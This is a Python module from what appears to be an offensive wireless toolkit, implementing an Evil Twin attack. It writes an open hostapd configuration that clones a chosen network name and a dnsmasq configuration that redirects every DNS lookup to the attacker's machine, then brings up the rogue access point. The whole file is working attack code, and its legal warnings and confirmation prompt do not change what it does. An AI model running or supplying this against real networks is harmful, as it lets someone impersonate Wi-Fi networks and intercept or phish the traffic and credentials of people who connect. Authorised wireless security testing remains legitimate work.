#!/usr/bin/env python3
"""Evil Twin Access Point"""

import subprocess
import os
import signal
import time
from ..utils.colors import Colors
from ..utils.interfaces import get_wifi_interfaces, select_interface
from ..utils.logger import Logger


HOSTAPD_CONF = "/tmp/bhtk_hostapd.conf"
DNSMASQ_CONF = "/tmp/bhtk_dnsmasq.conf"


def setup(interface=None, ssid=None, channel=6):
    """
    Set up an Evil Twin AP using hostapd and dnsmasq
    
    Args:
        interface: WiFi interface
        ssid: Network name to impersonate
        channel: Channel to broadcast on
    """
    if not interface or not ssid:
        print(Colors.error("Interface and SSID required"))
        return False
    
    print(Colors.warning("⚠️  Evil Twin attacks may be illegal without authorization!"))
    print(Colors.info(f"Setting up Evil Twin: {ssid}"))
    
    # Create hostapd config
    hostapd_config = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
    
    with open(HOSTAPD_CONF, 'w') as f:
        f.write(hostapd_config)
    
    # Create dnsmasq config
    dnsmasq_config = f"""interface={interface}
dhcp-range=192.168.4.2,192.168.4.20,255.255.255.0,24h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
address=/#/192.168.4.1
"""
    
    with open(DNSMASQ_CONF, 'w') as f:
        f.write(dnsmasq_config)
    
    try:
        # Configure interface
        print(Colors.info("Configuring interface..."))
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
        subprocess.run(['ip', 'addr', 'flush', 'dev', interface], check=True)
        subprocess.run(['ip', 'addr', 'add', '192.168.4.1/24', 'dev', interface], check=True)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
        
        # Start dnsmasq
        print(Colors.info("Starting DHCP/DNS server..."))
        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', DNSMASQ_CONF, '-d'])
        time.sleep(1)
        
        # Start hostapd
        print(Colors.info("Starting access point..."))
        print(Colors.success(f"Evil Twin '{ssid}' is now broadcasting!"))
        print(Colors.info("Clients connecting will get IP in 192.168.4.0/24"))
        print(Colors.info("Press Ctrl+C to stop"))
        
        hostapd_proc = subprocess.Popen(['hostapd', HOSTAPD_CONF])
        hostapd_proc.wait()
        
    except subprocess.CalledProcessError as e:
        print(Colors.error(f"Setup failed: {e}"))
        return False
    except KeyboardInterrupt:
        print(Colors.warning("\nShutting down Evil Twin..."))
    finally:
        # Cleanup
        subprocess.run(['killall', 'hostapd'], capture_output=True)
        subprocess.run(['killall', 'dnsmasq'], capture_output=True)
        subprocess.run(['ip', 'addr', 'flush', 'dev', interface], capture_output=True)
        os.remove(HOSTAPD_CONF) if os.path.exists(HOSTAPD_CONF) else None
        os.remove(DNSMASQ_CONF) if os.path.exists(DNSMASQ_CONF) else None
    
    return True


def interactive():
    """Interactive Evil Twin setup"""
    logger = Logger("evil_twin")
    
    interfaces = get_wifi_interfaces()
    interface = select_interface(interfaces, "WiFi")
    
    if not interface:
        return
    
    print(Colors.warning("\n⚠️  LEGAL WARNING: Only use on networks you own or have permission to test!\n"))
    
    # Get SSID to clone
    ssid = input(Colors.prompt("SSID to impersonate: ")).strip()
    if not ssid:
        print(Colors.error("SSID required"))
        return
    
    # Get channel
    channel_str = input(Colors.prompt("Channel [6]: ")).strip()
    channel = int(channel_str) if channel_str else 6
    
    logger.info(f"Evil Twin setup: SSID={ssid}, Channel={channel}")
    
    # Confirm
    confirm = input(Colors.prompt("Start Evil Twin? [y/N]: ")).strip().lower()
    if confirm != 'y':
        print(Colors.warning("Cancelled"))
        return
    
    setup(interface, ssid, channel)
